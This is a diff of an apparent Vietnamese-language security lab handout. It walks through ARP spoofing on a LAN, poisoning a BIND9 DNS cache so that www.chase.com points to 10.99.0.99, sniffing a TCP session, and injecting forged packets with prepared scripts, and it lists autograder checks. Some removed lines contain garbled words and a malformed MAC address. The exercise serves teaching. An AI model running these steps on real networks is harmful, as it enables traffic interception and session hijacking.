@@ -1,79 +1,116 @@
 BAI LAB: ARP-LEVEL DNS POISONING + TCP HIJACKING
-==========================================
+=================================================
 
 BOI CANH
 --------
-He thong gom 3 may ao tren cung mot mang LAN (192.168.0.0/24):
+He thong gom 4 may ao tren cung mot mang LAN (192.168.0.0/24):
 
-  - user   (192.168.0.100): may nan nhan, chuong trinh duy nhat, mo phien TCP.
-  - apollo-dns (192.168.0.10): may chu DNS BIND9, chua cache DNS.
-  - attacker (192.168.0.200): may cua ke tan cong (ban), co san scapy,
-    tcpdump, netwox va script arp-poison.
+  - user       (192.168.0.100): may nan nhan, dung DNS server 192.168.0.10
+                                va mo phien TCP toi server.
+  - apollo-dns (192.168.0.10):  may chu DNS BIND9, co cache DNS.
+  - server     (192.168.0.3):   dich vu TCP echo tren cong 9999, ghi log vao
+                                /var/log/session.log.
+  - attacker   (192.168.0.200): may cua ban, co scapy, tcpdump va script
+                                arp-poison / hijack.py.
 
-NHIEM VU CUA BAN (muc do TRUNG BINH)
--------------------------------------
+MUC TIEU
+--------
+1) ARP poisoning o muc LAN de chen vao giua user va cac server.
+2) Lam nhiem doc cache DNS cua apollo-dns (10.99.0.99).
+3) Bat va chen goi tin vao phien TCP user -> server.
 
-Buoc 1. Tren attacker, thuc hien ARP spoofing de giua user va apollo-dns:
-  
-      cd ~/.local/bin
-      sudo nohup ./arp-poison eth0 >/tmp/arp.log 2>&1 < /dev/null &
-      disown
-  
-  Kiem tra tren user: ip neigh | grep 192.168.0.10 phai thay dia chi
-  192.168.0.10 tro toi MAC cua attacker (02:42:c0:a8:00:c8).
+BUOC 1 - ARP spoofing
+---------------------
+Tren attacker:
 
-Buoc 2. Tren attacker, cau hong cache DNS Apollo:
-  
-      netwox 80 -e 02:42:c0:a8:00:c8 -i 192.168.0.10 -E 02:42:c0:a8:00:200 -I 192.168.0.100 -s 500
-      nohup netwox 80 ... >/tmp/n80.log 2>&1 &
-  
-  Kiem tra tren apollo-dns: sudo rndc flush. Sau do:
-      dig @192.168.0.10 www.chase.com +short
-  Phai tra ve: 10.99.0.99
+    cd ~/.local/bin
+    sudo nohup ./arp-poison eth0 >/tmp/arp.log 2>&1 < /dev/null &
+    disown
 
-Buoc 3. Tren user, mo phien TCP toi server (theo doi huong DNS gia mao):
-  
-      start-session
-  
-  Kiem tra tren server: sudo cat /var/log/session.log phai thay HELLO.
+Kiem tra tren user:
 
-Buoc 4. Tren attacker, dung tcpdump de sniff goi tin:
-  
-      sudo tcpdump -Z root -U -n -w ~/session.pcap 'tcp port 9999'
-  
-  De cua so chay, tren user gui them du lieu: echo PROBE | nc -w 3 192.168.0.3 9999
+    ip neigh | grep -E '192.168.0.(3|10)'
 
-  De doc capture (Ctrl+C truoc hoac mo terminal khac):
-      sudo tcpdump -nn -r ~/session.pcap
-  
-  Tim so sau:
-    - SEQ next cua user: lay tu goi SYN seq + 1 + do dai payload
-    - ACK cua server: SYN-ACK seq + 1 + 10
-    - sport: cordon nguon cua user
+Ca hai dia chi phai tro toi MAC cua attacker: 02:42:c0:a8:00:c8.
 
-Buoc 5. Tren attacker, chen goi tin gia mao vao phien TCP:
-  
-      sudo python3 hijack.py <seq> <ack> <sport>
-  
-  Vi du: sudo python3 hijack.py 2452713155 4262428 48844
+BUOC 2 - Lam nhiem doc cache DNS
+--------------------------------
+Tren attacker, chay bo tra loi DNS gia (script dns-poison.py):
 
-  Kiem tra tren server: sudo cat /var/log/session.log phai chua HIJACKED.
+    sudo nohup python3 ~/.local/bin/dns-poison.py eth0 \
+        >/tmp/dns-poison.log 2>&1 < /dev/null &
+    disown
+
+Tu user, gui truy van de apollo-dns phai forward ra ngoai:
+
+    dig www.chase.com A +short
+
+Apollo se forward truy van qua gateway 192.168.0.101. Do da ARP-spoof,
+goi tin di qua attacker va dns-poison.py tra loi ngay 10.99.0.99.
+
+Sau do kiem tra cache tren apollo-dns:
+
+    sudo rndc dumpdb -cache
+    sudo grep -A 4 -i chase /var/cache/bind/dump.db
+
+Phai thay 10.99.0.99 trong dump.
+
+BUOC 3 - Mo phien TCP
+---------------------
+Tren user:
+
+    start-session
+
+Go HELLO roi Enter. Giu terminal nay mo.
+
+BUOC 4 - Sniff phien TCP
+------------------------
+Tren attacker:
+
+    sudo tcpdump -Z root -U -n -w ~/session.pcap 'tcp port 9999'
+
+Doc capture:
+
+    sudo tcpdump -nn -r ~/session.pcap
+
+Xac dinh SEQ, ACK va cong nguon (sport) cua user.
+
+BUOC 5 - Chen goi tin
+---------------------
+Trong capture, tim goi P. tu user, vi du:
+
+    seq 1000:1006, ack 2000, length 6
+
+Tren attacker:
+
+    sudo python3 hijack.py 1000 2000 <sport> 6
+
+Trong do <sport> la cong nguon cua user va 6 la do dai payload
+(truong "length" cua goi tin). Script se dat goi chen tai seq + 6.
+
+BUOC 6 - Kiem tra
+-----------------
+Tren server:
+
+    sudo cat /var/log/session.log
+
+Phai thay RECV HELLO va RECV HIJACKED.
 
 KIEM TRA KET QUA
 ----------------
-Tu Linux host, chay lenh:
+Tu Linux host:
 
     checkwork
 
-De xem 4 checkwork: cw_arp_spoof, cw_dns_poison, cw_tcp_session, cw_tcp_hijacked.
+4 checkwork:
+    cw_arp_spoof     - ARP cua user tro toi MAC attacker
+    cw_dns_poison    - cache cua apollo-dns chua 10.99.0.99
+    cw_tcp_session   - server da nhan du lieu HELLO
+    cw_tcp_hijacked  - server da nhan du lieu HIJACKED
 
 KET THUC
 --------
-Khi hoan thanh, chay:
-
     stoplab
 
-LUA CHON THU TU THUC HANH:
-1. Phao yen: arp-poison -> cache DNS poison -> start-session -> sniff -> chen goi tin
-2. Tat pkill hoac dong terminal giua trinhieng, vi viec capture va chen phai dam bao ket noi con tro.
-3. Dung tcpdump kèm cflag -U de ghi file pcap that luc.
+Luu y: can bat ip_forward tren attacker (da bat san trong rc.local) de
+khong lam mat ket noi cua user khi ARP spoof.
